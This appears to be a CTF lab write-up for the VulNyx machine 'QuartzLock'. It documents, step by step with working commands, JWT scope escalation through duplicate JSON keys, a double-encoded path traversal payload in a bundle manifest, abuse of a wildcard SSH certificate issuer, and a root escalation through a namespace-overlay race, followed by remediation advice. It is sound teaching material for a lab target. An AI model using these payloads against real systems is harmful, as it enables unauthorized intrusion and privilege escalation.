
+++
title = "QuartzLock VulNyx: Writeup
date = 2026-0602T00:00:00Z
draft = false
tags = ["misc", "vulnyx", "labs"]     
categories = ["CTF Writeups"]
+++

# QuartzLock VulNyx: Writeup


## Target Summary

| Item | Value |
|---|---|
| Target | `192.168.100.143` |
| Primary hostname | `quartz.nyx` |
| Additional hosts | `api.nyx`, `enroll.nyx` |
| Initial execution | `svc-attest` |
| User foothold | `caden` |
| Root mechanism | `qctl replay` plugin overlay |
| User flag | `939dedafdb8d309b2d71c4f482210672` |
| Root flag | `16760b5a8e71fb62499088b89ac255b5` |

## Attack Chain

1. Discover `api.nyx` and `enroll.nyx` in the TLS certificate.
2. Abuse duplicate JSON `scope` keys to obtain a privileged JWT.
3. Upload a qpak containing a double-encoded WASI preopen traversal.
4. Reach `/run/quartz/worker.sock` and invoke `RunLegacyProbe`.
5. Execute commands as `svc-attest`.
6. Abuse wildcard asset matching in `qcert` to obtain an SSH certificate for
   `caden`.
7. SSH as `caden` and read the user flag.
8. Abuse the `qctl replay` namespace overlay to execute a case plugin as root.
9. Read the root flag.

## Requirements

The attacking system needs:

```text
nmap
openssl
curl
jq
tar
ssh-keygen
ssh
```

Set the target variable:

```bash
export TARGET=192.168.100.143
```

Either add the virtual hosts:

```bash
echo "$TARGET quartz.nyx api.nyx enroll.nyx" | sudo tee -a /etc/hosts
```

or use `curl --resolve`, as shown throughout this report.

## 1. Service Enumeration

Run the default script and version scan:

```bash
sudo nmap -sC -sV -vv -oA lock "$TARGET"
```

Relevant results:

```text
22/tcp   open   ssh        OpenSSH 9.9
80/tcp   open   http       nginx 1.26.3
443/tcp  open   ssl/http   nginx 1.26.3
```

Port 80 redirects to `https://quartz.nyx/`. The TLS certificate on port 443
contains the additional application hostnames.

![Nmap service scan](screenshots/01-terminal.png)

## 2. Virtual Host Discovery

Inspect the certificate:

```bash
openssl s_client \
  -connect "$TARGET:443" \
  -servername quartz.nyx </dev/null 2>/dev/null |
  openssl x509 -noout -subject -issuer -ext subjectAltName
```

The SAN extension discloses:

```text
DNS:quartz.nyx
DNS:api.nyx
DNS:enroll.nyx
```

![TLS SAN discovery](screenshots/02-terminal.png)

The primary portal confirms the device-trust theme and references API
documentation and attestation metadata.

![QuartzLock portal](screenshots/00-portal.png)

## 3. Documentation and Metadata

Retrieve the well-known metadata:

```bash
curl -sk \
  --resolve "quartz.nyx:443:$TARGET" \
  https://quartz.nyx/.well-known/quartz-attestation | jq
```

Important fields:

```json
{
  "accepted_scopes": [
    "device:enroll",
    "bundle:submit",
    "probe:upload"
  ],
  "canonicalization": "jcs-v1",
  "compatibility_mode": true,
  "legacy_parser": "stream",
  "token_format": "JWT"
}
```

The combination of JCS canonicalization and a legacy streaming parser is a
strong indication that separate components may interpret duplicate JSON keys
differently.

Open the documentation:

```bash
curl -sk \
  --resolve "quartz.nyx:443:$TARGET" \
  https://quartz.nyx/docs
```

The relevant endpoints are:

```text
POST /api/v2/enrollment/quote
POST /api/v2/enrollment/exchange
POST /api/v2/bundles
GET  /api/v2/jobs/{id}
```

The bundle endpoint requires `bundle:submit` or `probe:upload` and accepts
gzip-compressed `.qpak` files for the WASI compatibility profile.

![API documentation](screenshots/03-api-docs.png)

![Metadata and documentation output](screenshots/03-terminal.png)

## 4. Normal Enrollment

A normal enrollment request receives only `device:enroll`:

```bash
NORMAL='{
  "sub": "edge-node-117",
  "tenant": "public",
  "scope": ["device:enroll"]
}'

curl -sk \
  --resolve "api.nyx:443:$TARGET" \
  -H 'Content-Type: application/json' \
  --data-binary "$NORMAL" \
  https://api.nyx/api/v2/enrollment/exchange | jq
```

Expected scope:

```json
{
  "issued_scope": [
    "device:enroll"
  ]
}
```

That token cannot submit qpak bundles.

## 5. Duplicate-Key Scope Escalation

The policy validator consumes the final duplicate `scope` value, while the
legacy authorization parser uses the first value.

Send a privileged scope first and a harmless scope last:

```bash
EVIL='{
  "sub": "edge-node-117",
  "tenant": "public",
  "scope": ["bundle:submit", "probe:upload"],
  "scope": ["device:enroll"]
}'

RESPONSE=$(
  curl -sk \
    --resolve "api.nyx:443:$TARGET" \
    -H 'Content-Type: application/json' \
    --data-binary "$EVIL" \
    https://api.nyx/api/v2/enrollment/exchange
)

echo "$RESPONSE" | jq
export TOKEN=$(echo "$RESPONSE" | jq -r .token)
```

The server issues:

```json
{
  "issued_scope": [
    "bundle:submit",
    "probe:upload"
  ]
}
```

The JWT claims also contain both privileged scopes.

![Duplicate-key scope escalation](screenshots/04-terminal.png)

### Why It Works

The request has two valid interpretations:

```text
Canonical policy parser: last key wins  -> device:enroll
Legacy stream parser:     first key wins -> bundle:submit, probe:upload
```

Validation and authorization do not operate on the same parsed object.

## 6. qpak Format

The bundle must be a gzip-compressed tar archive containing exactly:

```text
manifest.toml
probe.wasm
policy.rego
sbom.json
```

Create a working directory:

```bash
WORK=/tmp/qpak-worker
rm -rf "$WORK"
mkdir -p "$WORK"
```

Create `manifest.toml`:

```bash
cat > "$WORK/manifest.toml" <<'EOF'
name = "legacy-worker-diagnostic"
version = "0.9.7"
runtime = "wasi"
entry = "probe.wasm"

[permissions]
network = false
filesystem = "job"

[compat]
preopen = "/var/lib/quartz/jobs/%252e%252e/%252e%252e/%252e%252e/%252e%252e/run/quartz"
EOF
```

Create `policy.rego`:

```bash
cat > "$WORK/policy.rego" <<'EOF'
package quartz.diagnostic

default allow = true
EOF
```

Create `sbom.json`:

```bash
cat > "$WORK/sbom.json" <<'EOF'
{
  "spdxVersion": "SPDX-2.3",
  "name": "legacy-worker-diagnostic",
  "supplier": "Organization: QuartzLock Systems",
  "packages": []
}
EOF
```

Despite its filename, `probe.wasm` may contain the legacy diagnostic JSON
format:

```bash
cat > "$WORK/probe.wasm" <<'EOF'
{
  "method": "RunLegacyProbe",
  "command": "/usr/bin/id",
  "args": []
}
EOF
```

Build the archive:

```bash
tar -czf /tmp/worker-id.qpak \
  -C "$WORK" \
  manifest.toml probe.wasm policy.rego sbom.json

tar -tzvf /tmp/worker-id.qpak
```

![qpak contents and traversal](screenshots/05-terminal.png)

## 7. Double-Decoded Preopen Traversal

The malicious path is:

```text
/var/lib/quartz/jobs/%252e%252e/%252e%252e/%252e%252e/%252e%252e/run/quartz
```

The API validator decodes once:

```text
%252e%252e -> %2e%2e
```

The resulting text still appears to be under `/var/lib/quartz/jobs`.

The runtime decodes again:

```text
%2e%2e -> ..
```

After normalization, the runtime preopens:

```text
/run/quartz
```

That directory contains `worker.sock`, which exposes `RunLegacyProbe`.

Upload the bundle:

```bash
JOB=$(
  curl -sk \
    --resolve "api.nyx:443:$TARGET" \
    -H "Authorization: Bearer $TOKEN" \
    -F "bundle=@/tmp/worker-id.qpak" \
    https://api.nyx/api/v2/bundles |
    jq -r .id
)

echo "$JOB"
```

Poll the job:

```bash
while true; do
  RESPONSE=$(
    curl -sk \
      --resolve "api.nyx:443:$TARGET" \
      -H "Authorization: Bearer $TOKEN" \
      "https://api.nyx/api/v2/jobs/$JOB"
  )

  echo "$RESPONSE" | jq
  STATUS=$(echo "$RESPONSE" | jq -r .status)
  [[ "$STATUS" != "queued" && "$STATUS" != "running" ]] && break
  sleep 1
done
```

Successful command execution:

```text
uid=993(svc-attest) gid=1003(quartz-runner) groups=1003(quartz-runner)
```

![Command execution as svc-attest](screenshots/06-terminal.png)

## 8. Command Execution Helper

The included [legacy_exec.sh](legacy_exec.sh) automates:

1. Creation of the legacy JSON `probe.wasm`.
2. qpak packaging.
3. Duplicate-key JWT acquisition.
4. Bundle upload.
5. Job polling.

Usage:

```bash
chmod +x legacy_exec.sh
TARGET=192.168.100.143 ./legacy_exec.sh /usr/bin/id
```

The first argument is the executable. Remaining arguments are passed through
as the JSON `args` array:

```bash
TARGET="$TARGET" ./legacy_exec.sh /bin/bash -c 'id; uname -a'
```

## 9. SSH Certificate Issuer Enumeration

The intended local path uses:

```text
/run/quartz-certd.sock
/usr/local/bin/qcert
/var/lib/quartz/db/assets.db
/etc/ssh/ca_user_key.pub
```

The asset database associates the `QL-EDGE-0001` serial with user `caden`.
The issuer performs flexible matching equivalent to SQL `LIKE`, so the serial
selector `QL-EDGE-%` resolves to that asset.

Generate an attacker-controlled keypair locally:

```bash
ssh-keygen -t ed25519 -f caden_key -N ''
```

Only the public key must be transferred to the target:

```bash
PUB64=$(base64 -w0 caden_key.pub)

TARGET="$TARGET" ./legacy_exec.sh /bin/bash -c \
  "echo '$PUB64' | base64 -d > /tmp/caden_key.pub &&
   /usr/local/bin/qcert sign \
     --serial 'QL-EDGE-%' \
     --pubkey /tmp/caden_key.pub \
     --out /tmp/caden_key-cert.pub"
```

Expected result:

```text
certificate written: /tmp/caden_key-cert.pub
principal: caden
valid_for: 1h
```

Retrieve the public certificate:

```bash
TARGET="$TARGET" ./legacy_exec.sh \
  /bin/cat /tmp/caden_key-cert.pub |
  sed 's/^legacy worker response: //' > caden_key-cert.pub
```

Inspect it:

```bash
ssh-keygen -Lf caden_key-cert.pub
```

The principal is `caden`.

![Wildcard certificate issuance](screenshots/07-terminal.png)

## 10. SSH as caden

Use the private key together with the signed certificate:

```bash
ssh \
  -i caden_key \
  -o CertificateFile=caden_key-cert.pub \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  "caden@$TARGET"
```

Confirm access:

```bash
id
hostname
cat /home/caden/user.txt
```

Result:

```text
uid=1001(caden) gid=1001(caden) groups=1001(caden),1002(quartz-maint)
quartzlock
939dedafdb8d309b2d71c4f482210672
```

The important group is `quartz-maint`.

![SSH access and user flag](screenshots/08-terminal.png)

## 11. qctl Replay Enumeration

As `caden`:

```bash
ls -l /usr/local/bin/qctl
qctl replay --help
cat /var/lib/quartz/cases/README.replay
```

Relevant permissions:

```text
-rwxr-x--- root quartz-maint /usr/local/bin/qctl
```

Expected case layout:

```text
case-id/
└── plugins/
    └── rpm-integrity
```

The maintenance service validates a trusted plugin path before creating a
runtime namespace. It then bind-mounts the user-controlled case plugin
directory over the trusted plugin directory and executes the same path.

The sequence is:

```text
1. Validate /usr/libexec/quartz/plugins/rpm-integrity.
2. Confirm it belongs to the trusted plugin directory.
3. Create the replay runtime.
4. Overlay case-id/plugins on /usr/libexec/quartz/plugins.
5. Execute /usr/libexec/quartz/plugins/rpm-integrity as root.
```

The path is trusted during validation but resolves to attacker-controlled
content after the namespace overlay.

## 12. Root Through qctl replay

Create a replay case:

```bash
CASE=case-root-writeup
mkdir -p "/var/lib/quartz/cases/$CASE/plugins"
```

Create the expected plugin:

```bash
cat > "/var/lib/quartz/cases/$CASE/plugins/rpm-integrity" <<'EOF'
#!/bin/bash
id
printf "root flag: "
cat /root/root.txt
EOF

chmod +x "/var/lib/quartz/cases/$CASE/plugins/rpm-integrity"
```

Trigger replay:

```bash
qctl replay "$CASE"
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
root flag: 16760b5a8e71fb62499088b89ac255b5
```

Remove the user-controlled case:

```bash
rm -rf "/var/lib/quartz/cases/$CASE"
```

![Root execution and root flag](screenshots/09-terminal.png)

## 13. Cleanup

Remove the temporary public key and certificate on the target:

```bash
TARGET="$TARGET" ./legacy_exec.sh /bin/rm -f \
  /tmp/caden_key.pub \
  /tmp/caden_key-cert.pub
```

Remove local keys when they are no longer needed:

```bash
rm -f caden_key caden_key.pub caden_key-cert.pub
```

The replay case in this reproduction was removed immediately after execution.

## Vulnerability Summary

| Boundary | Weakness | Impact |
|---|---|---|
| Enrollment API | Duplicate-key parser differential | Privileged JWT scopes |
| qpak runner | Inconsistent URL decoding and normalization | Access to internal worker socket |
| Certificate issuer | Wildcard serial matching | SSH certificate for another asset owner |
| Maintenance replay | Namespace overlay TOCTOU | Root command execution |

## Remediation

### Enrollment API

- Reject duplicate JSON keys before policy evaluation.
- Parse once and pass the same object to validation and authorization.
- Apply JCS canonicalization before any security decision.

### qpak Runner

- Decode and normalize the preopen path exactly once.
- Compare canonical filesystem paths after symlink resolution.
- Pass an already-open directory descriptor to the runner.
- Remove the legacy JSON probe compatibility mode.

### SSH Certificate Issuer

- Require exact serial equality.
- Reject `%`, `_`, glob characters, and regular expressions.
- Authorize the requested principal independently of asset lookup.
- Record and rate-limit certificate issuance.

### Maintenance Replay

- Do not validate a pathname before replacing its mount namespace.
- Open and verify the executable after the final mount layout exists.
- Require signed, root-owned replay plugins.
- Run replay plugins with a dedicated unprivileged account where possible.

## Reproduction Artifacts

- [Automated legacy worker command helper](legacy_exec.sh)
- [Malicious qpak manifest](qpak/legacy-manifest.toml)
- [Legacy probe JSON](qpak/legacy-probe.json)
- [Rego policy](qpak/policy.rego)
- [SPDX metadata](qpak/sbom.json)
- [Raw reproduced evidence](evidence/)
- [Screenshots](screenshots/)

